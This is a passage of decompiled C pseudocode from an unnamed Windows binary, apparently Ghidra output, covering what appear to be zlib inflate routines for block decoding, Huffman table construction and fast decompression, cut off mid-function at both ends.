        uVar6 = local_8 >> 3;
        puVar12 = (uint *)((int)puVar12 + -3);
        *(undefined4 *)this = 6;
        local_8 = uVar6;
        break;
      case 2:
        uVar6 = uVar6 >> 3;
        puVar12 = (uint *)((int)puVar12 + -3);
        *(undefined4 *)this = 3;
        local_8 = uVar6;
        break;
      case 3:
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_invalid_block_type_0041e3f0;
        *(uint *)((int)this + 0x20) = local_8 >> 3;
        *(byte **)((int)this + 0x1c) = (byte *)((int)puVar12 + -3);
        in_EAX[1] = local_10;
        param_1 = (byte *)0xfffffffd;
        goto LAB_004074ff;
      }
      break;
    case 1:
      for (; puVar12 < (uint *)0x20; puVar12 = puVar12 + 2) {
        if (local_10 == (byte *)0x0) goto LAB_00407575;
        local_10 = local_10 + -1;
        param_1 = (byte *)0x0;
        uVar6 = uVar6 | (uint)*local_c << ((byte)puVar12 & 0x1f);
        local_c = local_c + 1;
        local_8 = uVar6;
      }
      uVar5 = uVar6 & 0xffff;
      if (~uVar6 >> 0x10 != uVar5) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_invalid_stored_block_lengths_0041e404;
        param_1 = (byte *)0xfffffffd;
        goto LAB_004074f0;
      }
      puVar12 = (uint *)0x0;
      *(uint *)((int)this + 4) = uVar5;
      local_8 = 0;
      uVar6 = 0;
      if (uVar5 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      else {
        *(undefined4 *)this = 2;
      }
      break;
    case 2:
      if (local_10 == (byte *)0x0) {
LAB_00407575:
        *(uint *)((int)this + 0x20) = local_8;
        goto LAB_00407532;
      }
      if (local_18 == (byte *)0x0) {
        local_18 = (byte *)0x0;
        if (local_14 == *(byte **)((int)this + 0x2c)) {
          pbVar4 = *(byte **)((int)this + 0x30);
          pbVar3 = *(byte **)((int)this + 0x28);
          if (pbVar3 != pbVar4) {
            if (pbVar3 < pbVar4) {
              local_18 = pbVar4 + (-1 - (int)pbVar3);
            }
            else {
              local_18 = *(byte **)((int)this + 0x2c) + -(int)pbVar3;
            }
            local_14 = pbVar3;
            if (local_18 != (byte *)0x0) goto LAB_00406fb8;
          }
        }
        *(byte **)((int)this + 0x34) = local_14;
        param_1 = (byte *)FUN_004064e0((int)param_1);
        pbVar4 = *(byte **)((int)this + 0x30);
        local_14 = *(byte **)((int)this + 0x34);
        if (local_14 < pbVar4) {
          local_18 = pbVar4 + (-1 - (int)local_14);
        }
        else {
          local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_14);
        }
        if (local_14 == *(byte **)((int)this + 0x2c)) {
          pbVar3 = *(byte **)((int)this + 0x28);
          if (pbVar3 != pbVar4) {
            local_14 = pbVar3;
            if (pbVar3 < pbVar4) {
              local_18 = pbVar4 + (-1 - (int)pbVar3);
            }
            else {
              local_18 = *(byte **)((int)this + 0x2c) + -(int)pbVar3;
            }
          }
        }
        if (local_18 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = local_8;
          *(uint **)((int)this + 0x1c) = puVar12;
          iVar11 = (int)local_c - (int)*in_EAX;
          *in_EAX = local_c;
          in_EAX[1] = local_10;
          goto LAB_00407508;
        }
      }
LAB_00406fb8:
      param_1 = (byte *)0x0;
      local_1c = (uint *)*(byte **)((int)this + 4);
      if (local_10 < *(byte **)((int)this + 4)) {
        local_1c = (uint *)local_10;
      }
      if (local_18 < local_1c) {
        local_1c = (uint *)local_18;
      }
      FID_conflict__memcpy(local_14,local_c,(size_t)local_1c);
      local_c = local_c + (int)local_1c;
      local_10 = local_10 + -(int)local_1c;
      local_14 = local_14 + (int)local_1c;
      local_18 = local_18 + -(int)local_1c;
      piVar1 = (int *)((int)this + 4);
      *piVar1 = *piVar1 - (int)local_1c;
      uVar6 = local_8;
      if (*piVar1 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      break;
    case 3:
      for (; puVar12 < (uint *)0xe; puVar12 = puVar12 + 2) {
        if (local_10 == (byte *)0x0) goto LAB_004075b2;
        local_10 = local_10 + -1;
        param_1 = (byte *)0x0;
        uVar6 = uVar6 | (uint)*local_c << ((byte)puVar12 & 0x1f);
        local_c = local_c + 1;
        local_8 = uVar6;
      }
      *(uint *)((int)this + 4) = uVar6 & 0x3fff;
      if ((0x1d < (uVar6 & 0x1f)) || (uVar5 = (uVar6 & 0x3fff) >> 5 & 0x1f, 0x1d < uVar5)) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_too_many_length_or_distance_symb_0041e424;
        goto switchD_00406de1_caseD_9;
      }
      iVar11 = (*(code *)in_EAX[8])(in_EAX[10],uVar5 + 0x102 + (uVar6 & 0x1f),4);
      *(int *)((int)this + 0xc) = iVar11;
      if (iVar11 != 0) {
        uVar6 = local_8 >> 0xe;
        puVar12 = (uint *)((int)puVar12 + -0xe);
        *(undefined4 *)((int)this + 8) = 0;
        *(undefined4 *)this = 4;
        local_8 = uVar6;
        goto switchD_00406de1_caseD_4;
      }
      goto LAB_004075e7;
    case 4:
switchD_00406de1_caseD_4:
      if (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4) {
        do {
          for (; puVar12 < (uint *)0x3; puVar12 = puVar12 + 2) {
            if (local_10 == (byte *)0x0) {
LAB_004075b2:
              *(uint *)((int)this + 0x20) = local_8;
              *(uint **)((int)this + 0x1c) = puVar12;
              pbVar4 = *in_EAX;
              *in_EAX = local_c;
              in_EAX[2] = in_EAX[2] + ((int)local_c - (int)pbVar4);
              in_EAX[1] = (byte *)0x0;
              *(byte **)((int)this + 0x34) = local_14;
              FUN_004064e0((int)param_1);
              return;
            }
            local_10 = local_10 + -1;
            param_1 = (byte *)0x0;
            local_8 = uVar6 | (uint)*local_c << ((byte)puVar12 & 0x1f);
            local_c = local_c + 1;
            uVar6 = local_8;
          }
          *(uint *)(*(int *)((int)this + 0xc) +
                   *(int *)(&DAT_0041dd20 + *(int *)((int)this + 8) * 4) * 4) = uVar6 & 7;
          *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          local_8 = local_8 >> 3;
          puVar12 = (uint *)((int)puVar12 + -3);
          uVar6 = local_8;
        } while (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4);
      }
      uVar6 = *(uint *)((int)this + 8);
      while (uVar6 < 0x13) {
        *(undefined4 *)
         (*(int *)((int)this + 0xc) + *(int *)(&DAT_0041dd20 + *(int *)((int)this + 8) * 4) * 4) = 0
        ;
        *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
        uVar6 = *(uint *)((int)this + 8);
      }
      local_20 = *(byte **)((int)this + 0x24);
      local_24 = *(uint **)((int)this + 0xc);
      *(undefined4 *)((int)this + 0x10) = 7;
      local_18 = (byte *)0x0;
      local_1c = (uint *)(*(code *)in_EAX[8])(in_EAX[10],0x13,4);
      if (local_1c == (uint *)0x0) {
        local_1c = (uint *)0xfffffffc;
      }
      else {
        local_20 = (byte *)FUN_00407850(local_24,(uint *)&local_18,0x13,0x13,0,0,
                                        (uint **)((int)this + 0x14),(uint *)((int)this + 0x10),
                                        (int)local_20,local_1c);
        if (local_20 == (byte *)0xfffffffd) {
          in_EAX[6] = (byte *)s_oversubscribed_dynamic_bit_lengt_0041e464;
        }
        else if ((local_20 == (byte *)0xfffffffb) || (*(int *)((int)this + 0x10) == 0)) {
          in_EAX[6] = (byte *)s_incomplete_dynamic_bit_lengths_t_0041e48c;
          local_20 = (byte *)0xfffffffd;
        }
        (*(code *)in_EAX[9])(in_EAX[10],local_1c);
        local_1c = (uint *)local_20;
        if (local_20 == (byte *)0x0) {
          *(undefined4 *)((int)this + 8) = 0;
          *(undefined4 *)this = 5;
          uVar6 = local_8;
          goto switchD_00406de1_caseD_5;
        }
        if (local_20 == (byte *)0xfffffffd) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
      }
      *(uint *)((int)this + 0x20) = local_8;
      *(uint **)((int)this + 0x1c) = puVar12;
      in_EAX[1] = local_10;
      iVar11 = (int)local_c - (int)*in_EAX;
      *in_EAX = local_c;
      param_1 = (byte *)local_1c;
      goto LAB_00407508;
    case 5:
switchD_00406de1_caseD_5:
      if (*(uint *)((int)this + 8) <
          (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f)) {
        do {
          puVar10 = *(uint **)((int)this + 0x10);
          if (puVar12 < puVar10) {
            do {
              if (local_10 == (byte *)0x0) goto LAB_004075b2;
              local_10 = local_10 + -1;
              bVar9 = (byte)puVar12;
              puVar10 = *(uint **)((int)this + 0x10);
              puVar12 = puVar12 + 2;
              param_1 = (byte *)0x0;
              uVar6 = uVar6 | (uint)*local_c << (bVar9 & 0x1f);
              local_c = local_c + 1;
              local_8 = uVar6;
            } while (puVar12 < puVar10);
          }
          iVar11 = *(int *)((int)this + 0x14) +
                   (*(uint *)(&DAT_0041cbd8 + (int)puVar10 * 4) & uVar6) * 8;
          bVar9 = *(byte *)(iVar11 + 1);
          local_1c = (uint *)(uint)bVar9;
          local_28 = *(uint *)(iVar11 + 4);
          if (local_28 < 0x10) {
            local_8 = uVar6 >> (bVar9 & 0x1f);
            puVar12 = (uint *)((int)puVar12 - (int)local_1c);
            *(uint *)(*(int *)((int)this + 0xc) + *(int *)((int)this + 8) * 4) = local_28;
            *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          }
          else {
            if (local_28 == 0x12) {
              local_20 = (byte *)0x7;
            }
            else {
              local_20 = (byte *)(local_28 - 0xe);
            }
            local_18 = (byte *)((uint)(local_28 == 0x12) * 8 + 3);
            local_24 = (uint *)((int)local_1c + (int)local_20);
            for (; puVar12 < local_24; puVar12 = puVar12 + 2) {
              if (local_10 == (byte *)0x0) goto LAB_0040752c;
              local_10 = local_10 + -1;
              bVar2 = *local_c;
              local_c = local_c + 1;
              uVar6 = uVar6 | (uint)bVar2 << ((byte)puVar12 & 0x1f);
              param_1 = (byte *)0x0;
              local_8 = uVar6;
            }
            uVar6 = uVar6 >> (bVar9 & 0x1f);
            local_18 = local_18 + (*(uint *)(&DAT_0041cbd8 + (int)local_20 * 4) & uVar6);
            local_8 = uVar6 >> ((byte)local_20 & 0x1f);
            puVar12 = (uint *)((int)puVar12 - (int)(local_20 + (int)local_1c));
            iVar11 = *(int *)((int)this + 8);
            if ((byte *)((*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 +
                        (*(uint *)((int)this + 4) & 0x1f)) < local_18 + iVar11) {
LAB_00407679:
              (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
              *(undefined4 *)this = 9;
              in_EAX[6] = (byte *)s_invalid_bit_length_repeat_0041e448;
              *(uint *)((int)this + 0x20) = local_8;
              *(uint **)((int)this + 0x1c) = puVar12;
              in_EAX[1] = local_10;
              in_EAX[2] = in_EAX[2] + ((int)local_c - (int)*in_EAX);
              *in_EAX = local_c;
              *(byte **)((int)this + 0x34) = local_14;
              FUN_004064e0(-3);
              return;
            }
            if (local_28 == 0x10) {
              if (iVar11 == 0) goto LAB_00407679;
              uVar7 = *(undefined4 *)(*(int *)((int)this + 0xc) + -4 + iVar11 * 4);
            }
            else {
              uVar7 = 0;
            }
            do {
              *(undefined4 *)(*(int *)((int)this + 0xc) + iVar11 * 4) = uVar7;
              iVar11 = iVar11 + 1;
              local_18 = local_18 + -1;
            } while (local_18 != (byte *)0x0);
            *(int *)((int)this + 8) = iVar11;
            local_18 = (byte *)0x0;
          }
          uVar6 = local_8;
        } while (*(uint *)((int)this + 8) <
                 (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f))
        ;
      }
      *(undefined4 *)((int)this + 0x14) = 0;
      local_20 = (byte *)0x9;
      local_18 = (byte *)0x6;
      local_1c = (uint *)FUN_00407d90((*(uint *)((int)this + 4) & 0x1f) + 0x101,
                                      (*(uint *)((int)this + 4) >> 5 & 0x1f) + 1,
                                      *(uint **)((int)this + 0xc),(uint *)&local_20,
                                      (uint *)&local_18,&local_2c,&local_30,
                                      *(int *)((int)this + 0x24));
      if (local_1c != (uint *)0x0) {
        if (local_1c == (uint *)0xfffffffd) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_8;
        *(uint **)((int)this + 0x1c) = puVar12;
        in_EAX[1] = local_10;
        in_EAX[2] = in_EAX[2] + ((int)local_c - (int)*in_EAX);
        *in_EAX = local_c;
        *(byte **)((int)this + 0x34) = local_14;
        FUN_004064e0((int)local_1c);
        return;
      }
      puVar8 = (undefined4 *)(*(code *)in_EAX[8])(in_EAX[10],1,0x1c);
      if (puVar8 != (undefined4 *)0x0) {
        *(undefined *)(puVar8 + 4) = local_20._0_1_;
        *(undefined *)((int)puVar8 + 0x11) = local_18._0_1_;
        *puVar8 = 0;
        puVar8[5] = local_2c;
        puVar8[6] = local_30;
        *(undefined4 **)((int)this + 4) = puVar8;
        (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
        *(undefined4 *)this = 6;
        goto switchD_00406de1_caseD_6;
      }
LAB_004075e7:
      *(uint *)((int)this + 0x20) = local_8;
      *(uint **)((int)this + 0x1c) = puVar12;
      in_EAX[1] = local_10;
      param_1 = (byte *)0xfffffffc;
      goto LAB_004074ff;
    case 6:
switchD_00406de1_caseD_6:
      *(uint *)((int)this + 0x20) = local_8;
      *(uint **)((int)this + 0x1c) = puVar12;
      in_EAX[1] = local_10;
      in_EAX[2] = in_EAX[2] + ((int)local_c - (int)*in_EAX);
      *in_EAX = local_c;
      *(byte **)((int)this + 0x34) = local_14;
      iVar11 = FUN_00406620(this,(int)param_1);
      if (iVar11 != 1) goto LAB_00407759;
      param_1 = (byte *)0x0;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 4));
      local_10 = in_EAX[1];
      uVar6 = *(uint *)((int)this + 0x20);
      local_c = *in_EAX;
      puVar12 = *(uint **)((int)this + 0x1c);
      local_14 = *(byte **)((int)this + 0x34);
      if (local_14 < *(byte **)((int)this + 0x30)) {
        local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)local_14);
      }
      else {
        local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_14);
      }
      local_8 = uVar6;
      if (*(int *)((int)this + 0x18) != 0) {
        *(undefined4 *)this = 7;
        goto switchD_00406de1_caseD_7;
      }
      *(undefined4 *)this = 0;
      break;
    case 7:
switchD_00406de1_caseD_7:
      *(byte **)((int)this + 0x34) = local_14;
      iVar11 = FUN_004064e0((int)param_1);
      local_14 = *(byte **)((int)this + 0x34);
      if (*(byte **)((int)this + 0x30) != local_14) {
        *(uint *)((int)this + 0x20) = local_8;
        *(uint **)((int)this + 0x1c) = puVar12;
        in_EAX[1] = local_10;
        pbVar4 = *in_EAX;
        *in_EAX = local_c;
        in_EAX[2] = in_EAX[2] + ((int)local_c - (int)pbVar4);
        *(byte **)((int)this + 0x34) = local_14;
LAB_00407759:
        FUN_004064e0(iVar11);
        return;
      }
      *(undefined4 *)this = 8;
    case 8:
      goto switchD_00406de1_caseD_8;
    case 9:
switchD_00406de1_caseD_9:
      *(uint *)((int)this + 0x20) = local_8;
      *(uint **)((int)this + 0x1c) = puVar12;
      pbVar4 = *in_EAX;
      *in_EAX = local_c;
      in_EAX[2] = in_EAX[2] + ((int)local_c - (int)pbVar4);
      in_EAX[1] = local_10;
      *(byte **)((int)this + 0x34) = local_14;
      FUN_004064e0(-3);
      return;
    default:
      param_1 = (byte *)0xfffffffe;
LAB_004074f0:
      *(uint *)((int)this + 0x20) = local_8;
      *(uint **)((int)this + 0x1c) = puVar12;
      in_EAX[1] = local_10;
      goto LAB_004074ff;
    }
                    // WARNING: Load size is inaccurate
    uVar5 = *this;
  } while( true );
LAB_0040752c:
  *(uint *)((int)this + 0x20) = local_8;
LAB_00407532:
  *(uint **)((int)this + 0x1c) = puVar12;
  iVar11 = (int)local_c - (int)*in_EAX;
  *in_EAX = local_c;
  in_EAX[1] = (byte *)0x0;
  goto LAB_00407508;
switchD_00406de1_caseD_8:
  *(uint *)((int)this + 0x20) = local_8;
  *(uint **)((int)this + 0x1c) = puVar12;
  in_EAX[1] = local_10;
  param_1 = (byte *)0x1;
LAB_004074ff:
  iVar11 = (int)local_c - (int)*in_EAX;
  *in_EAX = local_c;
LAB_00407508:
  in_EAX[2] = in_EAX[2] + iVar11;
  *(byte **)((int)this + 0x34) = local_14;
  FUN_004064e0((int)param_1);
  return;
}



undefined4 FUN_004077c0(void)

{
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[10]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[9]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28));
  return 0;
}



void __fastcall
FUN_00407850(uint *param_1,uint *param_2,uint param_3,uint param_4,int param_5,int param_6,
            uint **param_7,uint *param_8,int param_9,uint *param_10)

{
  uint *puVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  uint *local_11c [15];
  uint **local_e0;
  uint **local_dc;
  int local_d8;
  uint local_d4;
  int local_d0;
  uint *local_cc;
  uint *local_c8;
  int local_c4;
  undefined4 local_c0;
  uint local_bc;
  uint local_b8;
  uint local_b4;
  uint *local_b0;
  uint local_ac;
  uint local_a8;
  uint local_a4;
  uint *local_a0;
  int local_9c;
  uint *local_98;
  uint local_94;
  uint local_90;
  uint local_8c [16];
  uint local_4c [17];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_d0 = param_9;
  local_c8 = param_10;
  local_a0 = param_1;
  local_b8 = param_3;
  local_dc = param_7;
  local_cc = param_2;
  local_4c[0] = 0;
  local_4c[1] = 0;
  local_4c[2] = 0;
  local_4c[3] = 0;
  local_4c[4] = 0;
  local_4c[5] = 0;
  local_4c[6] = 0;
  local_4c[7] = 0;
  local_4c[8] = 0;
  local_4c[9] = 0;
  local_4c[10] = 0;
  local_4c[11] = 0;
  local_4c[12] = 0;
  local_4c[13] = 0;
  local_4c[14] = 0;
  local_4c[15] = 0;
  uVar7 = param_3;
  do {
    local_4c[*param_1] = local_4c[*param_1] + 1;
    param_1 = param_1 + 1;
    uVar7 = uVar7 - 1;
  } while (uVar7 != 0);
  if (local_4c[0] == param_3) {
    *param_7 = (uint *)0x0;
    *param_8 = 0;
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  local_90 = *param_8;
  local_94 = 1;
  do {
    if (local_4c[local_94] != 0) break;
    local_94 = local_94 + 1;
  } while (local_94 < 0x10);
  if (local_90 < local_94) {
    local_90 = local_94;
  }
  local_ac = 0xf;
  do {
    if (local_4c[local_ac] != 0) break;
    local_ac = local_ac - 1;
  } while (local_ac != 0);
  if (local_ac < local_90) {
    local_90 = local_ac;
  }
  *param_8 = local_90;
  iVar10 = 1 << ((byte)local_94 & 0x1f);
  for (uVar7 = local_94; uVar7 < local_ac; uVar7 = uVar7 + 1) {
    if ((int)(iVar10 - local_4c[uVar7]) < 0) goto LAB_00407a69;
    iVar10 = (iVar10 - local_4c[uVar7]) * 2;
  }
  local_a8 = local_ac * 4;
  uVar7 = local_4c[local_ac];
  local_d8 = iVar10 - uVar7;
  if (-1 < local_d8) {
    local_4c[local_ac] = uVar7 + local_d8;
    iVar10 = 0;
    iVar8 = local_ac - 1;
    local_8c[1] = 0;
    if (iVar8 != 0) {
      iVar11 = 0;
      do {
        iVar10 = iVar10 + *(int *)((int)local_4c + iVar11 + 4);
        iVar8 = iVar8 + -1;
        *(int *)((int)local_8c + iVar11 + 8) = iVar10;
        iVar11 = iVar11 + 4;
      } while (iVar8 != 0);
    }
    uVar7 = 0;
    do {
      uVar9 = *local_a0;
      local_a0 = local_a0 + 1;
      local_98 = local_a0;
      if (uVar9 != 0) {
        uVar4 = local_8c[uVar9];
        param_10[uVar4] = uVar7;
        local_8c[uVar9] = uVar4 + 1;
      }
      uVar7 = uVar7 + 1;
    } while (uVar7 < param_3);
    local_b8 = local_8c[local_ac];
    local_98 = param_10;
    uVar7 = 0;
    iVar10 = -local_90;
    local_b4 = 0;
    local_8c[0] = 0;
    local_9c = -1;
    local_11c[0] = (uint *)0x0;
    local_a0 = (uint *)0x0;
    local_a8 = 0;
    if ((int)local_94 <= (int)local_ac) {
      local_b0 = local_4c + local_94;
      uVar4 = local_90;
      uVar9 = local_bc;
      do {
        uVar3 = *local_b0;
        while (uVar3 != 0) {
          local_a4 = uVar3 - 1;
          if ((int)(iVar10 + uVar4) < (int)local_94) {
            local_c4 = iVar10 - uVar4;
            local_d4 = uVar3;
            iVar8 = iVar10 + uVar4;
            do {
              iVar10 = iVar8;
              local_c4 = local_c4 + uVar4;
              local_9c = local_9c + 1;
              uVar7 = local_ac - iVar10;
              if (local_90 < local_ac - iVar10) {
                uVar7 = local_90;
              }
              uVar4 = local_94 - iVar10;
              uVar3 = 1 << ((byte)uVar4 & 0x1f);
              if ((local_d4 < uVar3) &&
                 (iVar8 = uVar3 + (-1 - local_a4), puVar5 = local_b0, uVar4 < uVar7)) {
                while (uVar4 = uVar4 + 1, uVar4 < uVar7) {
                  local_a0 = puVar5 + 1;
                  if ((uint)(iVar8 * 2) <= *local_a0) break;
                  iVar8 = iVar8 * 2 - *local_a0;
                  puVar5 = local_a0;
                }
              }
              local_a8 = 1 << ((byte)uVar4 & 0x1f);
              uVar7 = local_a8 + *local_cc;
              if (0x5a0 < uVar7) goto LAB_00407a69;
              puVar5 = (uint *)(local_d0 + *local_cc * 8);
              local_e0 = local_11c + local_9c;
              local_11c[local_9c] = puVar5;
              *local_cc = uVar7;
              local_a0 = puVar5;
              if (local_9c == 0) {
                *local_dc = puVar5;
              }
              else {
                local_8c[local_9c] = local_b4;
                uVar7 = local_b4 >> ((byte)local_c4 & 0x1f);
                puVar1 = local_e0[-1];
                uVar9 = ((int)puVar5 - (int)puVar1 >> 3) - uVar7;
                puVar1[uVar7 * 2] = local_c0;
                puVar1[uVar7 * 2 + 1] = uVar9;
              }
              iVar8 = iVar10 + local_90;
              uVar4 = local_90;
              uVar7 = local_b4;
            } while ((int)(iVar10 + local_90) < (int)local_94);
          }
          cVar2 = (char)local_94;
          bVar6 = (byte)iVar10;
          if (local_98 < local_c8 + local_b8) {
            uVar9 = *local_98;
            if (uVar9 < param_4) {
              local_c0._0_1_ = (-(uVar9 < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar8 = (uVar9 - param_4) * 4;
              local_c0._0_1_ = *(char *)(iVar8 + param_6) + 'P';
              uVar9 = *(uint *)(iVar8 + param_5);
            }
            local_98 = local_98 + 1;
          }
          else {
            local_c0._0_1_ = -0x40;
          }
          local_c0 = CONCAT31(CONCAT21(local_c0._2_2_,cVar2 - bVar6),(char)local_c0);
          iVar8 = 1 << (cVar2 - bVar6 & 0x1f);
          uVar4 = uVar7 >> (bVar6 & 0x1f);
          if (uVar4 < local_a8) {
            puVar5 = local_a0 + uVar4 * 2;
            do {
              *puVar5 = local_c0;
              puVar5[1] = uVar9;
              uVar4 = uVar4 + iVar8;
              puVar5 = puVar5 + iVar8 * 2;
              uVar7 = local_b4;
            } while (uVar4 < local_a8);
          }
          uVar3 = 1 << (cVar2 - 1U & 0x1f);
          uVar4 = uVar7 & uVar3;
          while (uVar4 != 0) {
            uVar7 = uVar7 ^ uVar3;
            uVar3 = uVar3 >> 1;
            uVar4 = uVar7 & uVar3;
          }
          uVar7 = uVar7 ^ uVar3;
          local_b4 = uVar7;
          uVar3 = local_a4;
          uVar4 = local_90;
          if (((1 << (bVar6 & 0x1f)) - 1U & uVar7) != local_8c[local_9c]) {
            do {
              iVar10 = iVar10 - local_90;
              local_9c = local_9c + -1;
            } while (((1 << ((byte)iVar10 & 0x1f)) - 1U & uVar7) != local_8c[local_9c]);
          }
        }
        local_b0 = local_b0 + 1;
        local_94 = local_94 + 1;
        local_a4 = 0;
      } while ((int)local_94 <= (int)local_ac);
    }
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
LAB_00407a69:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



int __cdecl
FUN_00407d90(uint param_1,uint param_2,uint *param_3,uint *param_4,uint *param_5,uint **param_6,
            uint **param_7,int param_8)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_8;
  
  local_8 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00407850(param_3,&local_8,param_1,0x101,0x41dda0,0x41de20,param_6,param_4,param_8,
                       puVar1);
  if (iVar2 == 0) {
    if (*param_4 != 0) {
      iVar2 = FUN_00407850(param_3 + param_1,&local_8,param_2,0,0x41dea0,0x41df18,param_7,param_5,
                           param_8,puVar1);
      if (iVar2 == 0) {
        if ((*param_5 != 0) || (param_1 < 0x102)) {
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return 0;
        }
      }
      else {
        if (iVar2 == -3) {
          *(char **)(unaff_EBX + 0x18) = s_oversubscribed_distance_tree_0041e4f4;
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -5) {
          *(char **)(unaff_EBX + 0x18) = s_incomplete_distance_tree_0041e514;
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -4) goto LAB_00407eb7;
      }
      *(char **)(unaff_EBX + 0x18) = s_empty_distance_tree_with_lengths_0041e530;
      iVar2 = -3;
LAB_00407eb7:
      (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
      return iVar2;
    }
  }
  else {
    if (iVar2 == -3) {
      *(char **)(unaff_EBX + 0x18) = s_oversubscribed_literal_length_tr_0041e4b0;
      goto LAB_00407eeb;
    }
    if (iVar2 == -4) goto LAB_00407eeb;
  }
  *(char **)(unaff_EBX + 0x18) = s_incomplete_literal_length_tree_0041e4d4;
  iVar2 = -3;
LAB_00407eeb:
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



undefined4 __cdecl
FUN_00407f00(uint param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  byte *pbVar1;
  byte *pbVar2;
  byte bVar3;
  byte bVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  undefined *puVar10;
  undefined *puVar11;
  uint uVar12;
  int iVar13;
  uint uVar14;
  uint uVar15;
  undefined *puVar16;
  undefined *local_10;
  byte *local_c;
  byte *local_8;
  
  local_c = param_6[1];
  local_8 = *param_6;
  uVar15 = *(uint *)(param_5 + 0x20);
  uVar6 = *(uint *)(param_5 + 0x1c);
  puVar16 = *(undefined **)(param_5 + 0x34);
  if (puVar16 < *(undefined **)(param_5 + 0x30)) {
    local_10 = *(undefined **)(param_5 + 0x30) + (-1 - (int)puVar16);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_5 + 0x2c) - (int)puVar16);
  }
  uVar12 = *(uint *)(&DAT_0041cbd8 + param_1 * 4);
  uVar5 = *(uint *)(&DAT_0041cbd8 + param_2 * 4);
  do {
    for (; uVar6 < 0x14; uVar6 = uVar6 + 8) {
      bVar3 = *local_8;
      local_c = local_c + -1;
      local_8 = local_8 + 1;
      uVar15 = uVar15 | (uint)bVar3 << ((byte)uVar6 & 0x1f);
    }
    bVar3 = *(byte *)(param_3 + (uVar12 & uVar15) * 8);
    uVar14 = (uint)bVar3;
    iVar13 = param_3 + (uVar12 & uVar15) * 8;
    bVar4 = *(byte *)(iVar13 + 1);
    uVar15 = uVar15 >> (bVar4 & 0x1f);
    if (uVar14 == 0) {
LAB_0040812c:
      uVar6 = uVar6 - bVar4;
      *puVar16 = *(undefined *)(iVar13 + 4);
      puVar16 = puVar16 + 1;
      local_10 = local_10 + -1;
    }
    else {
      uVar6 = uVar6 - *(byte *)(iVar13 + 1);
      while ((bVar3 & 0x10) == 0) {
        if ((uVar14 & 0x40) != 0) {
          if ((uVar14 & 0x20) != 0) {
            uVar12 = (int)param_6[1] - (int)local_c;
            if (uVar6 >> 3 < (uint)((int)param_6[1] - (int)local_c)) {
              uVar12 = uVar6 >> 3;
